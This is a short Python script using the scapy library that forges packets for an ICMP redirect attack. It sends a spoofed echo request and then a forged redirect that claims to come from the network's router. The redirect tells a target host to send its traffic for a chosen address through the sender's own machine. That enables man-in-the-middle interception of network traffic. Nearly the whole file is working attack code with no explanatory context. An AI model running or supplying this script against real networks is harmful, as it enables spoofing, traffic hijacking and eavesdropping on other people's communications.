#!venv/bin/python

from scapy.all import *
from scapy.all import  IP, ICMP
import settings


"""
ICMP redirect
"""

# ONE WAY 
icmp_req = IP(src=settings.icmp_redir_distant ,dst=settings.destination_ip)/ICMP()
send(icmp_req, iface=settings.source_interface)

redirect = IP(src=settings.router, dst=settings.destination_ip)\
    /ICMP(type=5, code=1, gw=settings.source_ip)\
    /IP(src=settings.destination_ip, dst=settings.icmp_redir_distant)\
    /ICMP(type=0, code=0)
send(redirect, iface=settings.source_interface)